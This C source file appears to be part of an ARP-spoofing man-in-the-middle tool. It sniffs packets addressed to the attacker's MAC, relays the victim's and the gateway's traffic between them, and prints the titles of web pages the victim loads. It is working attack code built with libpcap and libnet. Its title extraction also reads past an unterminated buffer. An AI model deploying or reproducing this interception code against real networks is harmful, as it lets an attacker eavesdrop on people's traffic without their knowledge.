/*
* MODULE: forward packet get from victim and gateway
* MAIN FUNCTION: Arpforward
* LICENSE: MIT License, Copyright (c) 2017 Yue Pan.
*/

#ifndef __PACKET_FORWARDER_H_
#define __PACKET_FORWARDER_H_

#include "head.h"

/* forward packet */
int forward_packet(char *dev, u_short pro_type, u_char *DST, u_char *SRC, const u_char *padPtr, int len) {

    /* definations */
    libnet_t *net_t = NULL;
    char err_buf[LIBNET_ERRBUF_SIZE];
    libnet_ptag_t p_tag;
    int res;

    /* start libnet */
    net_t = libnet_init(LIBNET_LINK_ADV, dev, err_buf);
    if (net_t == NULL) {
        printf("libnet start error\n");
        return 1;
    }

    /* build ethernet */
    p_tag = libnet_build_ethernet(DST, SRC, pro_type, padPtr, len, net_t, 0);
    if (p_tag == -1) {
        printf("libnet build_ethernet error\n");
        libnet_destroy(net_t);
        return 1;
    }

    /* send packet */
    for (int i = 0; i < 3; i++) {
        res = libnet_write(net_t);
        if (res == -1) {
            //printf("IP libnet write error\n");
            libnet_destroy(net_t);
            return 1;
        }
    }
    
    /* success */
    libnet_destroy(net_t);
    return 0;
}

/* pcap callback function */
void getPacket(u_char *arg, const struct pcap_pkthdr *hp, const u_char *packet) {

    /* receive argvs */
    struct arg real_arg = *(struct arg *)arg;
    char *dev = real_arg.dev;
    ethernet_header *pEther = (ethernet_header *)packet;
    ip_header *pIpv4 = (ip_header *)(packet + sizeof(ethernet_header));
    u_short pro_type = EPT_IPv4;
    u_char *data = (u_char *)(packet +sizeof(ethernet_header) + sizeof(ip_header) + sizeof(tcp_header));
    char *p = strstr(data, "<title>");
    char *q = strstr(data, "</title>");

    /* get packet sent from victim */
    if (!memcmp(pEther->SRC_mac, TARGET_MAC, 6) && !memcmp(pIpv4->dest_ip, GATEWAY_IP, 4)) {
        forward_packet(dev, pro_type, GATEWAY_MAC, ATTACKER_MAC, packet + 14, hp->len - 14);
    }
    else if (!memcmp(pEther->SRC_mac, GATEWAY_MAC, 6) && !memcmp(pIpv4->dest_ip, TARGET_IP, 4)) {
        if (p != NULL && q != NULL) {
            printf("FIND WEBPAGE!\n\n");
            char *HTML_title = (char *)malloc((q - p - 7) * sizeof(char));
            strncpy(HTML_title, p + 7, q - p - 7);
            printf("TITLE: %s\n\n", HTML_title);
            free(HTML_title);
        }
        forward_packet(dev, pro_type, TARGET_MAC, ATTACKER_MAC, packet + 14, hp->len - 14);
    }
}

int Arpforward(char *arg) {

    /* definations */
    struct arg real_arg = *(struct arg *)arg;
    char *dev = real_arg.dev;
    char errbuf[PCAP_ERRBUF_SIZE];
    char filter_app[40] = "ip and ether dst ";
    struct bpf_program filter;
    char my_mac[20];

    /* open device */
    pcap_t *handle = pcap_open_live(dev, 65536, 1, 0, errbuf);
    if (!handle) {
        printf("device open error.\n");
        exit(1);
    }

    /* filter compile */
    sprintf(my_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
    ATTACKER_MAC[0], ATTACKER_MAC[1], ATTACKER_MAC[2], ATTACKER_MAC[3], ATTACKER_MAC[4], ATTACKER_MAC[5]);
    strcat(filter_app, my_mac);
    pcap_compile(handle, &filter, filter_app, 1, 0);
    pcap_setfilter(handle, &filter);

    /* capturing packets */
    real_arg.handle = handle;
    pcap_loop(handle, -1, getPacket, (u_char *)&real_arg);

    /* end */
    pcap_close(handle);
    return 0;
}

#endif